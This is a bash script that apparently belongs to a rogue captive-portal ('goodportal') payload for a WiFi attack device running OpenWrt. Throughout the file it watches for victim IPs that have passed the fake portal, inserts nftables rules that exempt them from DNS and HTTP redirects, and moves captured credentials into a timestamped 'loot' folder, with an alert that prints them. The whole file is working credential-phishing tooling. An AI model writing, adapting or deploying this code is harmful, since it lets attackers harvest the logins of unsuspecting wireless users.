#!/bin/bash
# Whitelist monitor - watches for new MACs and applies firewall bypass rules
# Also handles copying credentials to persistent loot folder
# Runs in background, launched by goodportal_configure payload

WHITELIST_FILE="/tmp/goodportal_whitelist.txt"
PROCESSED_FILE="/tmp/goodportal_processed.txt"
CREDENTIALS_FILE="/tmp/goodportal_credentials.log"
LOOTDIR="/root/loot/goodportal"
PORTAL_IP="172.16.52.1"
SLEEP_INTERVAL=1

# Initialize processed file and loot directory
touch "$PROCESSED_FILE"
mkdir -p "$LOOTDIR"

logger -t goodportal-whitelist "Whitelist monitor started (PID: $$)"
logger -t goodportal-whitelist "Credentials will be saved to: $LOOTDIR"

while true; do
    # Check if whitelist file exists
    if [ ! -f "$WHITELIST_FILE" ]; then
        sleep "$SLEEP_INTERVAL"
        continue
    fi
    
    # Read whitelist and process new entries (now contains IPs directly)
    while IFS= read -r ip; do
        # Skip empty lines and comments
        [ -z "$ip" ] && continue
        [[ "$ip" =~ ^# ]] && continue
        
        # Trim whitespace
        ip=$(echo "$ip" | tr -d ' ')
        
        # Validate IP address format
        if ! echo "$ip" | grep -qE '^([0-9]{1,3}\.){3}[0-9]{1,3}$'; then
            logger -t goodportal-whitelist "Warning: Invalid IP format: $ip"
            continue
        fi
        
        # Skip if already processed
        if grep -q "^${ip}$" "$PROCESSED_FILE" 2>/dev/null; then
            continue
        fi
        
        logger -t goodportal-whitelist "Whitelisting IP: $ip"
        
        # Add firewall bypass rules via nftables for OpenWrt
        # NOTE: These rules are temporary and only exist in memory
        # They will be cleared when firewall restarts or device reboots
        # Using 'insert' to add rules at TOP of chain (before redirect rules)
        
        # Bypass DNS redirects for this IP (must be in dstnat_lan chain)
        nft insert rule inet fw4 dstnat_lan ip saddr "$ip" tcp dport 53 counter accept 2>/dev/null
        nft insert rule inet fw4 dstnat_lan ip saddr "$ip" udp dport 53 counter accept 2>/dev/null
        
        # Bypass HTTP/HTTPS redirects for this IP
        nft insert rule inet fw4 dstnat_lan ip saddr "$ip" tcp dport 80 counter accept 2>/dev/null
        nft insert rule inet fw4 dstnat_lan ip saddr "$ip" tcp dport 443 counter accept 2>/dev/null
        
        # Allow forwarding for this IP (in forward chain)
        nft insert rule inet fw4 forward_lan ip saddr "$ip" counter accept 2>/dev/null
        
        logger -t goodportal-whitelist "Firewall rules added for $ip"
        
        # Mark as processed
        echo "$ip" >> "$PROCESSED_FILE"
        
    done < "$WHITELIST_FILE"
    
    # Check for new credentials and save to timestamped loot file
    if [ -f "$CREDENTIALS_FILE" ] && [ -s "$CREDENTIALS_FILE" ]; then
        # Create timestamped filename
        timestamp=$(date +%Y-%m-%d_%H-%M-%S)
        loot_file="$LOOTDIR/credentials_$timestamp.log"
        
        # Copy credentials to timestamped loot file
        cp "$CREDENTIALS_FILE" "$loot_file"
        
        # Clear the temp file after successful copy
        if [ -f "$loot_file" ]; then
            > "$CREDENTIALS_FILE"
            logger -t goodportal-whitelist "Saved credentials to: $loot_file"
            ALERT true "goodportal captured new credentials!\n $(cat $loot_file)"
        fi
    fi
    
    sleep "$SLEEP_INTERVAL"
done
